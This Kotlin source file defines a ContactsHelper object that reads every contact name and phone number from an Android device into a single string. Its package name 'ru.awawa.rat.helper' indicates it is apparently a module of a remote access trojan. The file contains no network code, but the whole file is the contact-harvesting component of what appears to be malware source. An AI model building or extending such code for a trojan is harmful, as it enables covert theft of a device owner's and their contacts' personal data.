package ru.awawa.rat.helper

import android.content.Context
import android.provider.ContactsContract
import android.util.Log

object ContactsHelper {

    fun getContacts(context: Context): String {
        val builder = StringBuilder()

        val resolver = context.contentResolver
        val cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            null
        ) ?: return "none"

        if (cursor.count > 0) {
            while (cursor.moveToNext()) {
                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
                val name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                val phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)).toInt()
                if (phoneNumber > 0) {
                    val cursorPhone = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                        arrayOf(id),
                        null
                    )

                    if (cursorPhone?.count ?: 0 > 0) {
                        while (cursorPhone?.moveToNext() == true) {
                            val phoneNumberValue = cursorPhone.getString(
                                cursorPhone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            )
                            builder.append("Contact: ")
                                .append(name)
                                .append(", Phone Number: ")
                                .append(phoneNumberValue)
                                .append("\n")
                        }
                    }
                    cursorPhone?.close()
                }
            }
        }
        cursor.close()

        Log.d("", "Contacts read successful")
        return builder.toString()
    }
}